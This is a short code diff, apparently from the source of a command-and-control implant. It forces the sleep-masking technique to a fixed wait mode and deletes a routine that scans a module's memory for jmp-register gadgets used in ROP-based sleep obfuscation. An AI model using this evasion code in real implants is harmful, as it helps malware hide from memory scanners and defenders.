@@ -23,6 +23,8 @@ auto DECLFN Mask::Main(
 
     KhDbg( "sleep during: %d ms", RndTime );
 
+    this->Ctx.TechniqueID = MaskWait;
+
     switch( this->Ctx.TechniqueID ) {
     case MaskTimer:
         Success = this->Timer( RndTime ); break;
@@ -33,27 +35,6 @@ auto DECLFN Mask::Main(
     KhDbg( "[====== Exiting Sleep ======]\n" );
 
     return Success;
-}
-
-auto DECLFN Mask::FindGadget(
-    _In_ UPTR   ModuleBase,
-    _In_ UINT16 RegValue
-) -> UPTR {
-    UPTR   Gadget      = 0;
-    BYTE*  SearchBase  = NULL;
-    SIZE_T SearchSize  = 0;
-    UINT16 JmpValue    = 0xff;
-
-    SearchBase = B_PTR( ModuleBase + 0x1000 );
-    SearchSize = 0x1000 * 0x1000;    
-
-    for ( INT i = 0; i < SearchSize - 1; i++ ) {
-        if ( SearchBase[i] == JmpValue && SearchBase[i+1] == RegValue ) {
-            Gadget = U_PTR( SearchBase + i ); break;
-        }
-    }
-
-    return Gadget;
 }
 
 auto DECLFN Mask::Timer(
